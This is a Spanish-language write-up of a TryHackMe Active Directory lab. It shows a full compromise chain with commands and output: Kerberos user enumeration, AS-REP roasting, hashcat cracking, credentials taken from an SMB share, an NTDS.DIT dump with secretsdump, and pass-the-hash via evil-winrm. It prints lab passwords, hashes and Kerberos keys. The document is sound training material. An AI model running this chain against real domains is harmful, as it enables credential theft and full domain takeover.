---
Estado: Completado
Plataforma: Try Hack Me
SO: Windows
Dificultad: Medio
VectorInicial: AS-REP Roasting
ServicioInicial: Kerberos
PuertoInicial: 88
Credenciales:
  - svc-admin: management2005
  - backup: backup2517860
Usuarios:
  - svc-admin
  - backup
  - Administrator
Privesc: NTDS dump ÔåÆ Pass-the-Hash
Tecnicas:
  - SMB Enumeration
  - Kerberos User Enumeration
  - AS-REP Roasting
  - Password Cracking
  - SMB Share Enumeration
  - Credential Discovery
  - NTDS Dump
  - Pass-the-Has
Herramientas:
  - gomap
  - enum4linux
  - kerbrute
  - impacket
  - hashcat
  - smbclient
  - evil-winrm
Fecha: 2026-03-15
---
<img width="940" height="257" alt="Pasted image 20260315151219" src="https://github.com/user-attachments/assets/6cf25b5f-b31a-4883-90a3-a079f1b18a20" />

Lo primero que realizaremos sera una enumeraci├│n de los puertos abiertos y de los servicios que corren en la maquina.

```bash
é▒ gomap -s -p - $TARGET

  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
 ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
 ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
 ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
 ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ

­ Scanning 10.112.160.217 (65535 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
53      open   domain          
80      open   http            IIS 10.0 (Windows Server 2016 or later)
88      open                   
135     open   msrpc           Microsoft Windows RPC
139     open   netbios-ssn     
389     open   ldap            
445     open   microsoft-ds    Microsoft Windows
464     open                   
593     open                   
636     open   ldaps           
3268    open                   
3269    open                   
3389    open   ms-wbt-server   
5985    open   winrm           Microsoft-HTTPAPI/2.0
9389    open                   
47001   open   winrm           
49664   open                   
49665   open                   
49666   open                   
49669   open                   
49670   open                   
49672   open                   
49673   open                   
49677   open                   
49689   open                   
49699   open                   
49837   open                   

Host Exposure Summary
- 10.112.160.217 | open ports: 27 | critical: ldap, ldaps, microsoft-ds, ms-wbt-server, msrpc, winrm | exposure: high

Ô£ô Completed scan in 21.575s | hosts: 1 | open ports: 27
Ô£ô Completed scan in 2.27s | hosts: 1 | open ports: 15
```

Al ser una maquina de Windows obtendremos muchos puertos abiertos y mas siento un **AD** (Active Directory).

Los puertos a tener en cuenta son:
- 80 - Servicio web proporcionado por IIS.
- 139 - Nombres de maquinas.
- 445 - Servicio SMB para compartir archivos y mas.
- 5985 - Winrm para administraci├│n remota por linea de comando.

Vamos a proceder a una enumeraci├│n de los puertos *139 y 445* con la herramienta **enum4linux**.

```bash
é▒ enum4linux -U $TARGET
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 15 12:26:24 2026

 =========================================( Target Information )=========================================

Target ........... 10.112.160.217
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.112.160.217 )===========================


[E] Can't find workgroup/domain



 ==================================( Session Check on 10.112.160.217 )==================================


[+] Server 10.112.160.217 allows sessions using username '', password ''


 ===============================( Getting domain SID for 10.112.160.217 )===============================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ======================================( Users on 10.112.160.217 )======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

enum4linux complete on Sun Mar 15 12:26:36 2026
```

Con esto hemos conseguido unos posibles usuarios:
- administrator
- guest
- krbtgt
- domain admins
- root
- bin
- none

Ademas del nombre dominio de la maquina:
- THM-AD

Para hacer una enumeraci├│n mas fina tenemos que a├▒adir a nuestro */etc/host* la **IP** y el nombre de dominio **THM-AD** y **spookysec.local**.

```bash
é▒ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali-box

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.112.160.217 THM-AD spookysec.local
```

Ahora usaremos **kerbrute** para enumerar usuarios.

```bash
é▒ ./kerbrute userenum -d spookysec.local --dc $TARGET userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/15/26 - Ronnie Flathers @ropnop

2026/03/15 13:13:52 >  Using KDC(s):
2026/03/15 13:13:52 >  	10.112.160.217:88

2026/03/15 13:13:53 >  [+] VALID USERNAME:	james@spookysec.local
2026/03/15 13:13:53 >  [+] VALID USERNAME:	svc-admin@spookysec.local
2026/03/15 13:13:54 >  [+] VALID USERNAME:	James@spookysec.local
2026/03/15 13:13:54 >  [+] VALID USERNAME:	robin@spookysec.local
2026/03/15 13:13:57 >  [+] VALID USERNAME:	darkstar@spookysec.local
2026/03/15 13:13:59 >  [+] VALID USERNAME:	administrator@spookysec.local
2026/03/15 13:14:03 >  [+] VALID USERNAME:	backup@spookysec.local
2026/03/15 13:14:05 >  [+] VALID USERNAME:	paradox@spookysec.local
2026/03/15 13:14:17 >  [+] VALID USERNAME:	JAMES@spookysec.local
2026/03/15 13:14:21 >  [+] VALID USERNAME:	Robin@spookysec.local
2026/03/15 13:14:44 >  [+] VALID USERNAME:	Administrator@spookysec.local
2026/03/15 13:15:31 >  [+] VALID USERNAME:	Darkstar@spookysec.local
2026/03/15 13:15:48 >  [+] VALID USERNAME:	Paradox@spookysec.local
2026/03/15 13:16:42 >  [+] VALID USERNAME:	DARKSTAR@spookysec.local
2026/03/15 13:16:57 >  [+] VALID USERNAME:	ori@spookysec.local
2026/03/15 13:17:24 >  [+] VALID USERNAME:	ROBIN@spookysec.local
2026/03/15 13:18:41 >  Done! Tested 73317 usernames (16 valid) in 288.069 seconds
```

Vemos que destacan un par de usuario:
- svc-admin
- backup
- administrator
- Administrator

Pero estos 2 ├║ltimos tengo mis dudas con ellos, pero son interesantes.

Ahora pasaremos esta lista a un *txt* para que podamos trabajar bien con ella en las pr├│ximas acciones.

```txt
james
svc-admin
James
robin
darkstar
administrator
backup
paradox
JAMES
Robin
Administrator
Darkstar
Paradox
DARKSTAR
ori
ROBIN
```

Usaremos esta lista para ver que usuarios tienen la debilidad de AS-REP Roasting, que gira en torno a tener deshabilitada la preautenticaci├│n Kerberos, lo que permite pedir el ticket **sin contrase├▒a** y luego crackearlo offline.

```bash
é▒ ´Çî   python3 ../Repos/impacket/examples/GetNPUsers.py -no-pass -request -usersfile user.txt -dc-ip $TARGET spookysec.local/
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e1ed5a2a95d2d21abf332b844be2fc7a$3001fd693653f726dddc6c15a8e0369cbc74c2f3e674a2199451250a847dad0d8f1e0e9e9d50f5c12cb993cb076ba9e8f95f16e87e9407df30ef9e4fe6fa6fc1ff9697d785aff960b3e5205fa64ac40b24a1cc13b524b510ce0163410b0b64731006c91daa8d5f28adb344bf5ff16d70ae37e262a39328a9f5e1ba4b866e0802d966f70717ecc597c1797a441880c8b7ab799b2b0cfbc7d114c6c730a3876b3917021f968d573ff162d59b53195e24067998397f9d01a2211e3b4e9bf098530adb1faa6a4e9cc5deaff49a4ce9a96d7e528f9fba3a7e480799b3feb7b5fb5b786ccf526be6a42454ec2bb4fdd3c81b3aa287
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Con esto obtenemos el has del usuario **svc-admin**.

Vamos a proceder a comprometer la contrase├▒a.

```bash
é▒ hashcat -m 18200 scv.admin.txt passwordlist.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10400F CPU @ 2.90GHz, 2948/5897 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (3259 MB free)

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e1ed5a2a95d2d21abf332b844be2fc7a$3001fd693653f726dddc6c15a8e0369cbc74c2f3e674a2199451250a847dad0d8f1e0e9e9d50f5c12cb993cb076ba9e8f95f16e87e9407df30ef9e4fe6fa6fc1ff9697d785aff960b3e5205fa64ac40b24a1cc13b524b510ce0163410b0b64731006c91daa8d5f28adb344bf5ff16d70ae37e262a39328a9f5e1ba4b866e0802d966f70717ecc597c1797a441880c8b7ab799b2b0cfbc7d114c6c730a3876b3917021f968d573ff162d59b53195e24067998397f9d01a2211e3b4e9bf098530adb1faa6a4e9cc5deaff49a4ce9a96d7e528f9fba3a7e480799b3feb7b5fb5b786ccf526be6a42454ec2bb4fdd3c81b3aa287:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e1ed5a2a95d...3aa287
Time.Started.....: Sun Mar 15 13:52:49 2026 (0 secs)
Time.Estimated...: Sun Mar 15 13:52:49 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   113.8 kH/s (2.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/70188 (5.84%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: newzealand -> whitey
Hardware.Mon.#01.: Util: 19%

Started: Sun Mar 15 13:52:22 2026
Stopped: Sun Mar 15 13:52:50 2026
```

Con esto ya tenemos la combinaci├│n para acceder al sistema.
- svc-admin:management2005

Con estas credenciales podremos enumerar con mas facilidad con las herramientas que tenemos y obtener todos los datos que necesitamos.

```bash
 é▒ smbclient -L //$TARGET -U svc-admin%management2005

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.112.160.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Con **smbcliente** vemos el listado de recursos compartidos que tiene el servidor y nosotros tenemos acceso a `backup`.

Veamos que hay dentro.

```bash
é▒ smbclient //$TARGET/backup/ -U svc-admin%management2005 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

		8247551 blocks of size 4096. 4305867 blocks available
```

Parece que tenemos un fichero interesante en esta carpeta, vamos a descargarla y as├¡ tratarla.

```cmd
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \> 
```

Una vez la tengamos en el equipo podremos decodificar su contenido para ver que hay dentro.

```bash
é▒ cat backup_credentials.txt | base64 -d          
backup@spookysec.local:backup2517860   
```

Con este nuevo usuario tendremos acceso a mas contenido del servidor ya que por su nombre podemos intuir que nos dar├í acceso a copias de seguridad de mucho contenido y usuarios.

Veamos que podemos encontrar.

Para este fin usaremos `impacket-secretsdump` el cual nos permitir├í obtener el contenido de `NTDS.DIT`

```bash
é▒ echo $TARGET        
10.112.160.217


é▒ impacket-secretsdump spookysec.local/backup:backup2517860@10.112.160.217      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:18de254a60921753bfda1b62965e72ed:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:4168684ed8f2103c1735b9e546bfd92b02cc9363a51de24abdcbd5ec8c434b9a
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:fbf09f2ebb0ac930e7f8d9cf725208c5
ATTACKTIVEDIREC$:des-cbc-md5:8604fe2f2a8310fe
[*] Cleaning up...
```

Con esto hemos obtenidos los `hash` de los usuarios y sobre todo del que nos interesa `Adminitrator`.

Sigamos con la intrusi├│n.

Ahora nos conectaremos como el usuario `Adminstrator` usando la herramienta **evil-winrm**.

```bash
é▒ evil-winrm -i 10.112.160.217 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Ahora nos dispondremos a investigar para completar las flags de Try Hack Me para terminar el laboratorio.

Pero para ser una intrusi├│n podr├¡amos dejarlo aqu├¡.

El laboratorio es interesante y se aprende mucho con el.


